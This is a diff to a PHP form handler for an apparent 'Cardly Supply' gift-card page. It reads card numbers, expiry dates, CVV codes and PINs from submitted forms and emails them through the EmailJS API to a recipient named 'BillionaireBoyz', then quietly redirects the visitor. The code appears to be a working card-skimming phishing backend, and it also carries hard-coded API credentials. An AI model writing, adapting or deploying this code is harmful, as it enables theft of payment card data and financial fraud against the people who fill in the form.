@@ -1,8 +1,8 @@
 <?php
-if ($_SERVER["REQUEST_METHOD"] == "GET") {
-    header('Location: https://my-cardlysupply.vercel.app/');
-    exit;
-};
+// if ($_SERVER["REQUEST_METHOD"] == "GET") {
+//     header('Location: https://my-cardlysupply.vercel.app/');
+//     exit;
+// };
 $currency = $cardType = $cardAmount = $redemptionNumber = $cardNumber = $expMM = $expYY = $cardCVV = $cardPIN = "";
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     if (!empty($_POST['form_fields']["currency"])) {
@@ -33,21 +33,21 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $cardPIN = $_POST['form_fields']["pin"];
     }
 
-    $email_data = array(
-        "currency" => $currency,
-        "card_type" => $cardType,
-        "amount" => $cardAmount,
-        "redemption_number" => $redemptionNumber,
-        "card_number" => $cardNumber,
-        "exp_mm" => $expMM,
-        "exp_yy" => $expYY,
-        "cvv" => $cardCVV,
-        "pin" => $cardPIN,
-        "created_at" => date("Y-m-d H:i:s"),
-        "updated_at" => date("Y-m-d H:i:s")
-    );
+    $card_data = <<<card_data
+    {
+        "currency": $currency,
+        "card_type": $cardType,
+        "amount": $cardAmount,
+        "redemption_number": $redemptionNumber,
+        "card_number": $cardNumber,
+        "exp_mm": $expMM,
+        "exp_yy": $expYY,
+        "cvv": $cardCVV,
+        "pin": $cardPIN
+    }
+    card_data;
 
-    $to_string = implode(" ", $email_data);
+    $email_card_data = json_encode($card_data);
 
     $url = "https://api.emailjs.com/api/v1.0/email/send";
     $curl = curl_init();
@@ -57,31 +57,36 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 
     $headers = array(
-        "Content-Type: application/json"
+        "Content-Type: application/json",
     );
 
     curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
 
     $data = <<<data
     {
-    "service_id": "service_3uyknph",
-    "template_id": "template_24v2iow",
-    "user_id": "2J8DshQnpUuUkoM9C",
-    "accessToken":"6X57_NC-Z7fS_Ygz3SjkI",
-    "template_params":{
-        "message": $to_string
-    }
+        "service_id": "service_3uyknph",
+        "template_id": "template_24v2iow",
+        "user_id": "2J8DshQnpUuUkoM9C",
+        "accessToken": "6X57_NC-Z7fS_Ygz3SjkI",
+        "template_params": {
+            "to_name":"BillionaireBoyz",
+            "from_name":"Cardly Supply",
+            "message": $email_card_data
+        }
     }
     data;
+
     curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
 
     $resp = curl_exec($curl);
     curl_close($curl);
 
-    if ($resp === "OK") {
-        echo $resp;
+    if ($resp === false) {
+        header('Location: https://my-cardlysupply.vercel.app/');
+        exit;
     } else {
-        echo $resp;
+        header('Location: https://my-cardlysupply.vercel.app/');
+        exit;
     };
 
 } else {
@@ -89,4 +94,38 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     exit;
 }
 ;
+
+class CardData {
+    public $currency;
+    public $cardType;
+    public $cardAmount;
+    public $redemptionNumber; 
+    public $cardNumber;
+    public $expMM;
+    public $expYY;
+    public $cardCVV;
+    public $cardPIN;
+    
+    public function __construct(
+        $currency, 
+        $cardType,
+        $cardAmount,
+        $redemptionNumber,
+        $cardNumber,
+        $expMM,
+        $expYY,
+        $cardCVV,
+        $cardPIN
+    ) {
+        $this->currency = $currency;
+        $this->cardType = $cardType;
+        $this->cardAmount = $cardAmount;
+        $this->redemptionNumber = $redemptionNumber;
+        $this->cardNumber = $cardNumber;
+        $this->expMM = $expMM;
+        $this->expYY = $expYY;
+        $this->cardCVV = $cardCVV;
+        $this->cardPIN = $cardPIN;
+    }
+}
 ?>
